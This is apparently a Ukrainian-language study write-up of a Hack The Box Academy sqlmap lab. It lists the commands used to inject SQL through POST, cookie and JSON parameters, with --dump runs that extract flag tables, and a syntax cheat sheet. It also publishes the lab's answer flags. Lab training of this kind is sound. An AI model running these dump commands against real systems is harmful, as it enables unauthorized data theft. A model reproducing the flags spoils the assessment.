# SQLMap — Різні Injection Points (POST, Cookie, JSON)

## Модуль
[SQLMap Essentials — Running SQLMap on HTTP Requests](https://academy.hackthebox.com/app/module/58/section/517)

## Концепція

SQLi може бути в будь-якому параметрі запиту — не тільки GET.
Кожен тип вимагає різного синтаксису sqlmap.

## Виконані команди

### Case 2 — POST параметр

```bash
# Розвідка
curl -s http://TARGET/case2.php | grep -i "form\|input"
# → <input type='text' name='id'>

sqlmap -u "http://TARGET/case2.php" \
  --data="id=1" \
  --batch --dump -T flag2 --threads=5
```
flag2: HTB{700_much_c0n6r475_0n_p057_r3qu357}

### Case 3 — Cookie параметр

```bash
# Розвідка
curl -s http://TARGET/case3.php -D - | grep -i "set-cookie"
# → Set-Cookie: id=1

sqlmap -u "http://TARGET/case3.php" \
  --cookie="id=1" \
  --level=2 \           # ← level>=2 потрібен для cookie injection
  --batch --dump -T flag3 --threads=5
```
flag3: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

### Case 4 — JSON POST параметр

```bash
# Розвідка
curl -s http://TARGET/case4.php | grep -i "json\|content-type"
# → Content-Type: application/json, {"id": 1}

sqlmap -u "http://TARGET/case4.php" \
  --data='{"id": 1}' \
  --header="Content-Type: application/json" \
  --batch --dump -T flag4 --threads=5
# sqlmap автоматично детектує JSON і парсить параметри
```
flag4: HTB{j450n_v00rh335_53nd5_6r475}

---

## Injection Points — синтаксис sqlmap

| Тип | Параметр sqlmap | Приклад |
|-----|----------------|---------|
| GET | `-u "URL?id=1"` | `-u "http://site/page.php?id=1"` |
| POST form | `--data="id=1"` | `--data="username=a&id=1"` |
| Cookie | `--cookie="id=1"` + `--level=2` | `--cookie="PHPSESSID=abc; id=1"` |
| JSON POST | `--data='{"id":1}'` + `--header="Content-Type: application/json"` | автодетект |
| HTTP Header | `--header="X-Forwarded-For: 1*"` + `--level=3` | потрібен `*` маркер |
| Burp request | `-r request.txt` | найуніверсальніший метод |

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | Cookie injection → мінімум `--level=2` |
| 2 | JSON → sqlmap автодетектує при правильному `Content-Type` |
| 3 | Невідомий injection point → використовуй `-r request.txt` з Burp |
| 4 | `--batch` — не питати підтвердження, відповідати Y за замовчуванням |
| 5 | `--dump -T tablename` — дампити конкретну таблицю без зайвого шуму |

## Відповіді

| Q | Flag |
|---|------|
| Q1 (Case 2 — POST) | `HTB{700_much_c0n6r475_0n_p057_r3qu357}` |
| Q2 (Case 3 — Cookie) | `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}` |
| Q3 (Case 4 — JSON) | `HTB{j450n_v00rh335_53nd5_6r475}` |
